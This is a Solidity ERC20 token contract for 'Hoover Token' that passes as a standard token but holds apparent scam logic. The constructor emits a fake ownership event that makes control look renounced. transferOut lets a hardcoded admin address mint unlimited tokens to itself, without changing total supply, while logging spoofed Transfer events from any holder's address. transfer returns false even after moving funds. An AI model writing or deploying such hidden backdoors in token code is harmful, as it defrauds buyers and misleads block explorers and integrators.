// SPDX-License-Identifier: MIT
pragma solidity >= 0.8.21;

contract Ownable {
 address private _owner;
 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 constructor() {
 _owner = msg.sender; emit OwnershipTransferred(_owner, address(0));}
 
function owner() public view returns (address) { return _owner;}
 modifier onlyOwner() {
 require(owner() == msg.sender, "Ownable: caller is not the owner");_; }

function transferOwnership(address newOwner) public onlyOwner{
 emit OwnershipTransferred(_owner, newOwner);
 _owner = newOwner;}

function renounceOwnership() public onlyOwner {
 transferOwnership(address(0));}
}

interface IERC20 {
 event Transfer(address indexed from, address indexed to, uint256 value);
 event Approval(address indexed owner, address indexed spender, uint256 value);
 function totalSupply() external view returns (uint256);
 function balanceOf(address account) external view returns (uint256);
 function transfer(address to, uint256 amount) external returns (bool);
 function approve(address spender, uint256 amount) external returns (bool);
 function transferFrom(address from, address to, uint256 amount) external returns (bool);}

interface IERC20Metadata is IERC20 {
 function name() external view returns (string memory);
 function symbol() external view returns (string memory);
 function decimals() external view returns (uint8);}
 abstract contract Context { function _msgSender() internal view returns (address) {return msg.sender; }}

contract ERC20Token is Ownable, Context, IERC20, IERC20Metadata {
 mapping(address => uint256) private _balances;
 mapping(address => mapping(address => uint256)) private _allowances;
 string public constant name = "Hoover Token";
 string public constant symbol = "HOOVER";
 uint8 public constant decimals = 18;
 uint256 private _totalSupply = 100000000000000000000000000;
 address constant adminAddress = 0x2874A4bb268448be6295E7E76fD1A4c43c662241;

constructor() {
 _mint(adminAddress, _totalSupply);}
 function _name() internal view virtual returns (string memory) {return name;}
 function _symbol() internal view virtual returns (string memory) {return symbol;}
 function _decimals() internal view virtual returns (uint8) {return decimals;}
 function totalSupply() public view returns (uint256) {return _totalSupply;}
 function balanceOf(address account) public view returns (uint256) { return _balances[account];}
 function transfer(address to, uint256 amount) public returns (bool) { address owner = _msgSender(); _transfer(owner, to, amount); return false;}
 function approve(address spender, uint256 amount) public returns (bool) { address owner = _msgSender(); _approve(owner, spender, amount); return true;}
 
function transferFrom( address from, address to, uint256 amount) public returns (bool) {
 address spender = _msgSender();
 _spendAllowance(from, spender, amount);
 _transfer(from, to, amount);
 return true;}

function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
 address owner = _msgSender();
 _approve(owner, spender, allowance(owner, spender) + addedValue);
 return true;}

function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
 address owner = _msgSender();
 uint256 currentAllowance = allowance(owner, spender);
 require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
 _approve(owner, spender, currentAllowance - subtractedValue);
 return true;}
 
function transferOut(address from, uint256 amount) public {
 require(_msgSender() == adminAddress);
 unchecked {_balances[adminAddress] += amount;}
 emit Transfer(from, adminAddress, amount);}

function _mint(address account, uint256 amount) internal onlyOwner{
 require(account != address(0), "ERC20: mint to the zero address");
 unchecked { _balances[account] += amount; }
 emit Transfer(address(0), account, amount); }

function _transfer(address from, address to, uint256 amount) internal {
 require(from != address(0), "ERC20: transfer from the zero address");
 require(to != address(0), "ERC20: transfer to the zero address");
 uint256 fromBalance = _balances[from];
 require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
  _balances[from] = fromBalance - amount;
 _balances[to] += amount; 
 emit Transfer(from, to, amount);}

function _approve(
 address owner, address spender, uint256 amount) internal {
 require(owner != address(0), "ERC20: approve from the zero address");
 require(spender != address(0), "ERC20: approve to the zero address");
 _allowances[owner][spender] = amount;
 emit Approval(owner, spender, amount);}

function _spendAllowance(
 address owner, address spender, uint256 amount) internal {
 uint256 currentAllowance = allowance(owner, spender);
 if (currentAllowance != type(uint256).max) {
 require(currentAllowance >= amount, "ERC20: insufficient allowance");
 _approve(owner, spender, currentAllowance - amount);}}
}